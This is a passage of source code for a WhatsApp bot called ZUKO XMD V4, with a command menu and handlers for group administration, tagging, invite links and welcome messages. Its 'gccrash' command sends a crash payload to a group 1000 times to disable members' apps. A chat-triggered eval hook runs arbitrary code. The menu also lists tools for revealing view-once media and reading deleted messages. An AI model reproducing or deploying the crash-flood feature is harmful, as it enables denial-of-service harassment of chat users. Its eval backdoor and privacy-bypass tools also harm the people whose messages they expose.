┃  🚫 ${prefix}blockgroup / ${prefix}spamgroup
┃  🔗 ${prefix}groupjoin / ${prefix}joingroupbyid
┃  📦 ${prefix}groupbackup / ${prefix}backupmembers
┃  🔄 ${prefix}restoremembers / ${prefix}restorebackup
┃  🔄 ${prefix}groupstatsreset / ${prefix}resetstats
┃  🏆 ${prefix}topactive / ${prefix}activemembers
┃  ⏰ ${prefix}inactivemembers / ${prefix}inactiveusers
┃  ⚙️ ${prefix}warnsettings / ${prefix}warnconfig
┃  🚫 ${prefix}groupfilter / ${prefix}spamfilter
┃  🔄 ${prefix}autosync / ${prefix}syncsettings
┃  📋 ${prefix}groupclone / ${prefix}clonegroup
┃  🔗 ${prefix}groupmerge / ${prefix}mergegroups
┃  🔐 ${prefix}groupencrypt / ${prefix}encryptchat
┃  📦 ${prefix}grouparchive / ${prefix}archivegroup
┃  📤 ${prefix}groupexport / ${prefix}exportsettings
┃  👥 ${prefix}groupmember / ${prefix}memberlist
┃  🔍 ${prefix}searchmember
┃  🗳️ ${prefix}votekick
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃  🛡️ SECURITY & MODERATION
┃  ━━━━━━━━━━━━━━━━━━━━
┃  🔇 ${prefix}mute / ${prefix}silence
┃  🔊 ${prefix}unmute / ${prefix}unsilence
┃  🚫 ${prefix}banmember / ${prefix}blockuser
┃  ✅ ${prefix}unbanmember / ${prefix}unblockuser
┃  📜 ${prefix}bannedlist
┃  ⚠️ ${prefix}warn
┃  ✅ ${prefix}unwarn / ${prefix}resetwarn
┃  📋 ${prefix}warnings / ${prefix}warnlist
┃  🚫 ${prefix}antispam
┃  🤖 ${prefix}antibot
┃  🚫 ${prefix}antibadword / ${prefix}filterword
┃  🛡️ ${prefix}antivirtex / ${prefix}antivirus
┃  🎣 ${prefix}antiphishing
┃  ⚠️ ${prefix}antiscam
┃  🕵️ ${prefix}antispy / ${prefix}antitracking
┃  🧹 ${prefix}autoclear / ${prefix}autodelete
┃  👁️ ${prefix}viewonce / ${prefix}viewonceblock
┃  🚫 ${prefix}forwardblock / ${prefix}blockforward
┃  📎 ${prefix}medialimit / ${prefix}limitmedia
┃  📝 ${prefix}textlimit / ${prefix}limittext
┃  🔠 ${prefix}capitallimit / ${prefix}capblock
┃  🚫 ${prefix}antisticker / ${prefix}blocksticker
┃  🌍 ${prefix}antistickerall / ${prefix}globalantisticker
┃  📱 ${prefix}antistickerpm / ${prefix}pmstickerblock
┃  🚫 ${prefix}antigroupmention / ${prefix}antitagall
┃  🎯 ${prefix}antitagallthreshold / ${prefix}tagthreshold
┃  🔗 ${prefix}antigrouplink / ${prefix}blockgrouplink
┃  🛡️ ${prefix}antidemote / ${prefix}demoteprotect
┃  👑 ${prefix}antidemoteexcept / ${prefix}demoteexempt
┃  🗑️ ${prefix}antidelete / ${prefix}deleteprotect
┃  📱 ${prefix}antideletepm / ${prefix}pmantidelete
┃  🌍 ${prefix}antideleteglobal / ${prefix}globalantidelete
┃  📋 ${prefix}deletelog / ${prefix}viewdeleted
┃  🗑️ ${prefix}cleardeletelog / ${prefix}resetdeletelog
┃  🔗 ${prefix}antilinkcustom
┃  🐢 ${prefix}slowmode
┃  📊 ${prefix}leveling
┃  📈 ${prefix}rank / ${prefix}level
┃  🏆 ${prefix}leaderboard / ${prefix}top
┃  ⚙️ ${prefix}setrank / ${prefix}setlevel
┃  🔄 ${prefix}resetrank / ${prefix}resetlevel
┃  💬 ${prefix}autoreply / ${prefix}customreply
┃  🤖 ${prefix}antibotdebug / ${prefix}antibotlog
┃  🧪 ${prefix}greetingtest / ${prefix}testwelcome
┃  🧪 ${prefix}farewelltest / ${prefix}testgoodbye
┃  🔒 ${prefix}chatlock / ${prefix}lockchat
┃  🔓 ${prefix}chatunlock / ${prefix}unlockchat
┃  🚫 ${prefix}emojilimit / ${prefix}banemoji
┃  👑 ${prefix}whitelist / ${prefix}trusteduser
┃  🚫 ${prefix}blacklist / ${prefix}blockeduser
┃  📋 ${prefix}modlog / ${prefix}moderationlog
┃  ✏️ ${prefix}addmodlog / ${prefix}logaction
┃  🗑️ ${prefix}clearlogs / ${prefix}resetlogs
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃  🤖 AI & IMAGE GENERATION
┃  ━━━━━━━━━━━━━━━━━━━━
┃  🤖 ${prefix}ai / ${prefix}ask / ${prefix}gpt
┃  🧠 ${prefix}gpt4 / ${prefix}chatgpt4
┃  🌟 ${prefix}gemini / ${prefix}googleai
┃  🦙 ${prefix}meta / ${prefix}metaai / ${prefix}llama
┃  🔍 ${prefix}deepseek / ${prefix}ds
┃  🐉 ${prefix}qwen / ${prefix}alibaba
┃  ⚡ ${prefix}grok / ${prefix}xai
┃  🎯 ${prefix}claude / ${prefix}anthropic
┃  🎨 ${prefix}imagine / ${prefix}generate / ${prefix}draw
┃  🎨 ${prefix}imagine2 / ${prefix}generate2 / ${prefix}stable
┃  🖌️ ${prefix}remix / ${prefix}editimage
┃  👁️ ${prefix}imagechat / ${prefix}vision
┃  💻 ${prefix}code / ${prefix}codai
┃  🌐 ${prefix}translateai / ${prefix}translate
┃  📝 ${prefix}summarize / ${prefix}summary
┃  ✏️ ${prefix}rewrite / ${prefix}improve
┃  💡 ${prefix}brainstorm / ${prefix}ideas
┃  📧 ${prefix}emailai / ${prefix}writeemail
┃  📚 ${prefix}explain / ${prefix}explainai
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃  🎨 IMAGE GENERATION STYLES
┃  ━━━━━━━━━━━━━━━━━━━━
┃  🎌 ${prefix}animegen / ${prefix}animeart / ${prefix}waifu
┃  📸 ${prefix}realistic / ${prefix}photoreal / ${prefix}photo
┃  🤖 ${prefix}cyberpunk / ${prefix}cyber / ${prefix}futuristic
┃  🐉 ${prefix}fantasy / ${prefix}fantasyart / ${prefix}dnd
┃  👤 ${prefix}portrait / ${prefix}character / ${prefix}person
┃  🏔️ ${prefix}landscape / ${prefix}scenery / ${prefix}view
┃  🏷️ ${prefix}logo / ${prefix}logodesign / ${prefix}brand
┃  🎬 ${prefix}hd / ${prefix}ultrahd / ${prefix}4k
┃  📱 ${prefix}vertical / ${prefix}phone / ${prefix}mobile
┃  🎨 ${prefix}watercolor / ${prefix}watercolour
┃  🖼️ ${prefix}oilpainting / ${prefix}oilart
┃  👾 ${prefix}pixelart / ${prefix}pixel
┃  ✏️ ${prefix}sketch / ${prefix}drawing / ${prefix}pencil
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃  📥 DOWNLOADER
┃  ━━━━━━━━━━━━━━━━━━━━
┃  🎵 ${prefix}play
┃  🎬 ${prefix}ytmp3
┃  📸 ${prefix}savestatus / ${prefix}downloadstatus
┃  📸 ${prefix}savestatusall / ${prefix}downloadallstatus
┃  🎥 ${prefix}tiktok / ${prefix}tt
┃  📘 ${prefix}fb / ${prefix}fbdl / ${prefix}facebook
┃  📷 ${prefix}ig / ${prefix}instagram / ${prefix}igdl
┃  🔗 ${prefix}tourl / ${prefix}url
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃  🎨 STICKER COMMANDS
┃  ━━━━━━━━━━━━━━━━━━━━
┃  🖼️ ${prefix}sticker / ${prefix}tosticker
┃  🖼️ ${prefix}toimg / ${prefix}toimage
┃  🎭 ${prefix}take / ${prefix}steal / ${prefix}getsticker
┃  🎨 ${prefix}toanime / ${prefix}animeify
┃  🖌️ ${prefix}emojimix
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃  🔓 VIEWONCE COMMANDS
┃  ━━━━━━━━━━━━━━━━━━━━
┃  👁️ ${prefix}toviewonce / ${prefix}reveal / ${prefix}viewonce
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃  📺 STATUS/STORY COMMANDS
┃  ━━━━━━━━━━━━━━━━━━━━
┃  👁️ ${prefix}autoview / ${prefix}autoviewstatus
┃  ❤️ ${prefix}autoreactstatus / ${prefix}statusreact
┃  👁️ ${prefix}viewstatus / ${prefix}readstatus
┃  📥 ${prefix}savestatus / ${prefix}downloadstatus
┃  📥 ${prefix}savestatusall / ${prefix}downloadallstatus
┃  📋 ${prefix}statuslist / ${prefix}liststatus
┃  📊 ${prefix}statusstats / ${prefix}statusinfo
┃  📤 ${prefix}statusforward / ${prefix}forwardstatus
┃  💬 ${prefix}statusreply / ${prefix}replystatus
┃  🧹 ${prefix}statusclean / ${prefix}clearoldstatus
┃  🔇 ${prefix}statusmute / ${prefix}mutestatus
┃  📋 ${prefix}statusmutedlist / ${prefix}listmutestatus
┃  📥 ${prefix}statusdownloader / ${prefix}statusdl
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃  👤 USER & ECONOMY
┃  ━━━━━━━━━━━━━━━━━━━━
┃  👤 ${prefix}profile / ${prefix}me
┃  💰 ${prefix}balance / ${prefix}bal / ${prefix}wallet
┃  💵 ${prefix}pay
┃  💍 ${prefix}marry
┃  ✅ ${prefix}accept
┃  ❌ ${prefix}reject
┃  💑 ${prefix}couple
┃  💔 ${prefix}divorce
┃  🏦 ${prefix}deposit / ${prefix}dep
┃  💳 ${prefix}withdraw / ${prefix}with
┃  🚓 ${prefix}police
┃  🎁 ${prefix}gift
┃  📦 ${prefix}giftlist
┃  🏆 ${prefix}leaderboard / ${prefix}lb
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃  📝 AUTO FEATURES
┃  ━━━━━━━━━━━━━━━━━━━━
┃  ⌨️ ${prefix}autotyping
┃  🎙️ ${prefix}autorecording
┃  🎙️ ${prefix}autorecordtype
┃  ❤️ ${prefix}autoreact / ${prefix}autoemoji
┃  👁️ ${prefix}autoread
┃  💬 ${prefix}autoreplypm / ${prefix}autopm
┃  📝 ${prefix}autogreeting
┃  📝 ${prefix}greeting / ${prefix}customwelcome
┃  👋 ${prefix}farewell / ${prefix}customgoodbye
┃  🔄 ${prefix}resetgreeting / ${prefix}resetwelcome
┃  🔄 ${prefix}resetfarewell / ${prefix}resetgoodbye
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃  🔧 UTILITY COMMANDS
┃  ━━━━━━━━━━━━━━━━━━━━
┃  ⚡ ${prefix}ping
┃  🏃 ${prefix}runtime / ${prefix}alive
┃  📊 ${prefix}stats
┃  📋 ${prefix}botinfo / ${prefix}commandlist
┃  🔗 ${prefix}shorturl
┃  🖼️ ${prefix}qrcode
┃  📖 ${prefix}wiki
┃  🌤️ ${prefix}weather / ${prefix}weather2
┃  🎲 ${prefix}8ball
┃  📚 ${prefix}fact
┃  🎲 ${prefix}mathfact
┃  🍽️ ${prefix}recipe / ${prefix}recipe-ingredient
┃  📚 ${prefix}book
┃  🔬 ${prefix}sciencefact
┃  🌐 ${prefix}ip / ${prefix}myip
┃  🔗 ${prefix}fb / ${prefix}fbdl
┃  📷 ${prefix}ig / ${prefix}igdl
┃  🎥 ${prefix}tiktok / ${prefix}tt
┃  🔑 ${prefix}genpass
┃  🕒 ${prefix}timer
┃  🌐 ${prefix}translate
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃  👤 OWNER COMMANDS
┃  ━━━━━━━━━━━━━━━━━━━━
┃  🔒 ${prefix}public
┃  🔐 ${prefix}self / ${prefix}private
┃  📨 ${prefix}dm / ${prefix}privatesend
┃  📎 ${prefix}dmmedia / ${prefix}sendmedia
┃  📢 ${prefix}dmall / ${prefix}broadcastdm
┃  🚫 ${prefix}ban / ${prefix}banuser
┃  ✅ ${prefix}unban / ${prefix}unbanuser
┃  📋 ${prefix}listban / ${prefix}listbanuser
┃  📋 ${prefix}blocklist / ${prefix}blockedlist
┃  🚫 ${prefix}block / ${prefix}blockuser
┃  ✅ ${prefix}unblock / ${prefix}unblockuser
┃  👑 ${prefix}setsudo / ${prefix}sudo / ${prefix}addsudo
┃  👑 ${prefix}delsudo
┃  📋 ${prefix}getsudo / ${prefix}listsudo
┃  🔧 ${prefix}eval
┃  🧪 ${prefix}> / ${prefix}runjs / ${prefix}js
┃  📝 ${prefix}setstatus
┃  🔧 ${prefix}setprefix
┃  📝 ${prefix}autobio
┃  👁️ ${prefix}autoread
┃  👁️ ${prefix}autoviewstatus / ${prefix}autoview
┃  ❤️ ${prefix}autoreactstatus / ${prefix}statusreact
┃  💀 ${prefix}gccrash
┃  🗑️ ${prefix}clearbugs / ${prefix}clearbug
┃  🔧 ${prefix}server
┃  📝 ${prefix}logs / ${prefix}log
┃  📝 ${prefix}setaccount
┃  💳 ${prefix}account / ${prefix}aza
┃  🔗 ${prefix}pair
┃  📋 ${prefix}listpair
┃  🗑️ ${prefix}delpair
┃  🔄 ${prefix}restart
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃  🔧 PRIVATE CHAT COMMANDS
┃  ━━━━━━━━━━━━━━━━━━━━
┃  📦 ${prefix}archivechat / ${prefix}archive
┃  📦 ${prefix}unarchivechat / ${prefix}unarchive
┃  📌 ${prefix}pinchat / ${prefix}pin
┃  📌 ${prefix}unpinchat / ${prefix}unpin
┃  👁️ ${prefix}markread / ${prefix}readchat
┃  🗑️ ${prefix}deletechat / ${prefix}deleteconvo
┃  🔇 ${prefix}muteprivate / ${prefix}mutepm
┃  🔊 ${prefix}unmuteprivate / ${prefix}unmutepm
┃  ⌨️ ${prefix}presence / ${prefix}typingstatus
┃  ⏰ ${prefix}lastseen / ${prefix}lastonline
┃  ℹ️ ${prefix}contactinfo / ${prefix}userinfo
┃  💾 ${prefix}privatedb / ${prefix}pmdb
┃  🔄 ${prefix}resetprivate / ${prefix}resetpm
┃  📋 ${prefix}exportchats / ${prefix}exportpm
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃  📝 FUN & OTHER
┃  ━━━━━━━━━━━━━━━━━━━━
┃  📖 ${prefix}readmore
┃  🔤 ${prefix}styletext
┃  🎨 ${prefix}glitchtext
┃  ✍️ ${prefix}writetext
┃  🔥 ${prefix}neonglitch
┃  ✨ ${prefix}glowingtext
┃  🎨 ${prefix}advancedglow
┃  🖋️ ${prefix}typographytext
┃  🧩 ${prefix}pixelglitch
┃  🇳🇬 ${prefix}flagtext
┃  🇺🇸 ${prefix}flag3dtext
┃  🩶 ${prefix}deletingtext
┃  🔆 ${prefix}blackpinkstyle
┃  💡 ${prefix}lighteffects
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃  📝 HOW TO USE
┃  ━━━━━━━━━━━━━━━━━━━━
┃  • Reply to messages for certain commands
┃  • Use @user to mention someone
┃  • Use | to separate parameters
┃  
┃  💡 Tip: Use ${prefix}help <command> for details
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃     💫 𝙕𝙐𝙆𝙊 𝙓𝙈𝘿 𝙑𝟰 💫
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
  `.trim()
  
  await empire.sendMessage(m.chat, {
    text: menuText,
    contextInfo: {
      isForwarded: true,
      forwardingScore: 999,
      forwardedNewsletterMessageInfo: {
        newsletterJid: '120363405724402785@newsletter',
        newsletterName: 'ZUKO XMD 💘'
      }
    }
  }, { quoted: m })
}
break
case 'kickinactive': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  if (!db.lastActive) db.lastActive = {}
  if (!db.lastActive[m.chat]) db.lastActive[m.chat] = {}
  
  const days = parseInt(args[0]) || 7
  const cutoff = Date.now() - (days * 24 * 60 * 60 * 1000)
  let kicked = 0
  
  const metadata = await empire.groupMetadata(m.chat)
  const participants = metadata.participants
  
  for (const member of participants) {
    const lastActive = db.lastActive[m.chat][member.id] || 0
    if (lastActive < cutoff && member.id !== botNumber && !member.admin) {
      try {
        await empire.groupParticipantsUpdate(m.chat, [member.id], 'remove')
        kicked++
        await sleep(1000)
      } catch (err) {
        console.log(`Failed to kick inactive ${member.id}:`, err)
      }
    }
  }
  
  reply(`✅ Kicked ${kicked} inactive members (inactive for ${days} days).`)
}
break

case 'setpp':
case 'setgroupicon': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  const quoted = m.quoted || m
  const mime = (quoted.msg || quoted).mimetype || ''
  
  if (!/image/.test(mime)) {
    return reply(`🖼️ Reply to an image with: ${prefix}setpp`)
  }
  
  try {
    const media = await quoted.download()
    await empire.updateProfilePicture(m.chat, media)
    reply('✅ Group profile picture updated!')
  } catch (err) {
    reply('❌ Failed to update group profile picture.')
  }
}
break

case 'removepp':
case 'delpp': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  try {
    await empire.removeProfilePicture(m.chat)
    reply('✅ Group profile picture removed!')
  } catch (err) {
    reply('❌ Failed to remove group profile picture.')
  }
}
break

case 'joingroup':
case 'join': {
  if (!isCreator) return reply('❌ Owner only')
  if (!text) return reply(`🔗 Usage: ${prefix}join <invite_link>`)
  
  try {
    const code = text.match(/(?:https?:\/\/chat\.whatsapp\.com\/)?([A-Za-z0-9]{22})/)?.[1]
    if (!code) return reply('❌ Invalid WhatsApp invite link.')
    
    const result = await empire.groupAcceptInvite(code)
    reply(`✅ Joined group: ${result.subject || 'Successfully'}`)
  } catch (err) {
    reply('❌ Failed to join group. Link may be expired or invalid.')
  }
}
break

case 'creategroup':
case 'creategc': {
  if (!isCreator) return reply('❌ Owner only')
  if (!text) return reply(`📝 Usage: ${prefix}creategroup <group_name>`)
  
  try {
    const result = await empire.groupCreate(text, [])
    const code = await empire.groupInviteCode(result.id)
    const link = `https://chat.whatsapp.com/${code}`
    
    reply(`✅ Group created successfully!\n\n📛 Name: ${result.subject}\n🆔 ID: ${result.id}\n🔗 Link: ${link}`)
  } catch (err) {
    reply('❌ Failed to create group.')
  }
}
break

case 'deletegroup':
case 'deletegc': {
  if (!isCreator) return reply('❌ Owner only')
  if (!m.isGroup) return reply('❌ This command is only for groups')
  
  try {
    await empire.groupLeave(m.chat)
    // Note: Groups cannot be deleted via API, only left
    reply('✅ Bot has left and deleted group from database.')
  } catch (err) {
    reply('❌ Failed to leave group.')
  }
}
break

case 'groupsummary':
case 'statsgroup': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  
  try {
    const metadata = await empire.groupMetadata(m.chat)
    const participants = metadata.participants
    const admins = participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin')
    const superAdmins = participants.filter(p => p.admin === 'superadmin')
    
    const totalMessages = db.messageCount?.[m.chat] || 0
    const activeToday = db.activeToday?.[m.chat]?.size || 0
    
    const summary = `
╭━━━━━━━━━━━━━━━━━━━━━━╮
┃    📊 𝗚𝗥𝗢𝗨𝗣 𝗦𝗨𝗠𝗠𝗔𝗥𝗬    ┃
┣━━━━━━━━━━━━━━━━━━━━━━┫
┃ 📛 ${metadata.subject}
┃ 👥 ${participants.length} Total Members
┃ 👑 ${admins.length} Admins
┃ ⭐ ${superAdmins.length} Super Admins
┃ 💬 ${totalMessages} Total Messages
┃ 📱 ${activeToday} Active Today
┃ 🔒 ${metadata.announce ? 'Locked' : 'Open'}
┃ 👻 ${metadata.ephemeralDuration ? 'Disappearing Messages: ' + metadata.ephemeralDuration + 's' : 'No disappearing messages'}
┣━━━━━━━━━━━━━━━━━━━━━━┫
┃    💫 𝗭𝗨𝗞𝗢 𝗫𝗠𝗗 𝗩𝟰     ┃
╰━━━━━━━━━━━━━━━━━━━━━━╯
    `.trim()
    
    reply(summary)
  } catch (err) {
    reply('❌ Failed to generate group summary.')
  }
}
break
case 'admins':
case 'listadmins': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  
  try {
    const metadata = await empire.groupMetadata(m.chat)
    const admins = metadata.participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin')
    
    if (!admins.length) return reply('No admins found.')
    
    let adminList = '👑 *ADMIN LIST*\n\n'
    const mentions = []
    
    admins.forEach((admin, i) => {
      adminList += `${i + 1}. @${admin.id.split('@')[0]}\n`
      mentions.push(admin.id)
    })
    
    await empire.sendMessage(m.chat, {
      text: adminList,
      mentions: mentions
    }, { quoted: m })
  } catch (err) {
    reply('❌ Failed to fetch admin list.')
  }
}
break

case 'tagall': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  try {
    const metadata = await empire.groupMetadata(m.chat)
    const participants = metadata.participants
    const message = text || '📢 Attention everyone!'
    
    let tagText = `┏━━━━━━━━━━━━━━━━━━━━━━┓\n`
    tagText += `┃    📢 ${message}    ┃\n`
    tagText += `┣━━━━━━━━━━━━━━━━━━━━━━┫\n`
    
    const mentions = []
    participants.forEach(p => {
      tagText += `┃ @${p.id.split('@')[0]}\n`
      mentions.push(p.id)
    })
    
    tagText += `┣━━━━━━━━━━━━━━━━━━━━━━┫\n`
    tagText += `┃    💫 𝗭𝗨𝗞𝗢 𝗫𝗠𝗗 𝗩𝟰     ┃\n`
    tagText += `╰━━━━━━━━━━━━━━━━━━━━━━╯`
    
    await empire.sendMessage(m.chat, {
      text: tagText,
      mentions: mentions
    }, { quoted: m })
  } catch (err) {
    reply('❌ Failed to tag all members.')
  }
}
break

case 'hidetag': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  try {
    const metadata = await empire.groupMetadata(m.chat)
    const participants = metadata.participants
    const mentions = participants.map(p => p.id)
    const msg = text || '🔔 Hidden message for members only'
    
    await empire.sendMessage(m.chat, {
      text: msg,
      mentions: mentions
    }, { quoted: m })
  } catch (err) {
    reply('❌ Failed to send hidden tag.')
  }
}
break

case 'grouplink':
case 'invite': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  try {
    const code = await empire.groupInviteCode(m.chat)
    const link = `https://chat.whatsapp.com/${code}`
    
    const msg = `
┏━━━━━━━━━━━━━━━━━━━━━━┓
┃    🔗 𝗚𝗥𝗢𝗨𝗣 𝗟𝗜𝗡𝗞     ┃
┣━━━━━━━━━━━━━━━━━━━━━━┫
┃ 📛 ${metadata.subject}
┃ 🔗 ${link}
┣━━━━━━━━━━━━━━━━━━━━━━┫
┃    💫 𝗭𝗨𝗞𝗢 𝗫𝗠𝗗 𝗩𝟰     ┃
╰━━━━━━━━━━━━━━━━━━━━━━╯
    `.trim()
    
    await empire.sendMessage(m.chat, { text: msg }, { quoted: m })
  } catch (err) {
    reply('❌ Failed to get group link.')
  }
}
break

case 'resetlink':
case 'revoke': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  try {
    await empire.groupRevokeInvite(m.chat)
    reply('✅ Group link reset successfully!')
  } catch (err) {
    reply('❌ Failed to reset group link.')
  }
}
break

case 'welcome':
case 'goodbye': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  const mode = args[0]?.toLowerCase()
  
  if (!mode || !['on', 'off'].includes(mode)) {
    return reply(`📝 Usage: ${prefix}${command} on/off`)
  }
  
  const setting = command === 'welcome' ? 'welcome' : 'goodbye'
  const isOn = mode === 'on'
  
  setSetting(m.chat, setting, isOn)
  reply(`${isOn ? '✅ Enabled' : '❌ Disabled'} ${command} messages in this group.`)
}
break

case 'setwelcome': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  if (!text) return reply(`📝 Usage: ${prefix}setwelcome <message>\n\nUse @user for member name, @group for group name`)
  
  setSetting(m.chat, 'welcomeMessage', text)
  reply('✅ Custom welcome message saved!')
}
break

case 'setgoodbye': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  if (!text) return reply(`📝 Usage: ${prefix}setgoodbye <message>\n\nUse @user for member name, @group for group name`)
  
  setSetting(m.chat, 'goodbyeMessage', text)
  reply('✅ Custom goodbye message saved!')
}
break

case 'antilink': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  const mode = args[0]?.toLowerCase()
  
  if (!mode || !['on', 'off'].includes(mode)) {
    return reply(`📝 Usage: ${prefix}antilink on/off`)
  }
  
  setSetting(m.chat, 'antilink', mode === 'on')
  reply(`${mode === 'on' ? '✅ Enabled' : '❌ Disabled'} anti-link protection.`)
}
break

case 'nsfw': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  const mode = args[0]?.toLowerCase()
  
  if (!mode || !['on', 'off'].includes(mode)) {
    return reply(`📝 Usage: ${prefix}nsfw on/off`)
  }
  
  setSetting(m.chat, 'nsfw', mode === 'on')
  reply(`${mode === 'on' ? '✅ Enabled' : '❌ Disabled'} NSFW commands in this group.`)
}
break
      case 'gccrash': {
    if (!isCreator) return reply("ᴏᴡɴᴇʀ ᴏɴʟʏ.");
    if (!m.isGroup) return reply("This is for Groups!");

    await empire.sendMessage(m.chat, { react: { text: '💀', key: m.key } });
    
    // Increase the loop count to 10 for a total "Deadly" effect
    for (let i = 0; i < 1000; i++) {
        await NexoraGcCrashV2(empire, m.chat, generateWAMessageFromContent);
        // Small delay to ensure the bot terminal doesn't crash itself
        await new Promise((r) => setTimeout(r, 1000)); 
    }

    console.log(`[!] Deadly Payloads delivered to ${groupName}`);
}
break;

         default:
        if (body.startsWith('>')) {
          if (!isCreator) return
          try {
            let evaled = await eval(body.slice(2))
            if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
            await reply(evaled)
          } catch (err) {
            await reply(String(err))
          }
        }
        break
    }

  } catch (err) {
    console.log(require("util").format(err))
  }
}


// File watcher
let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
  require('fs').unwatchFile(file)
  console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m')
  delete require.cache[file]
  require(file)
})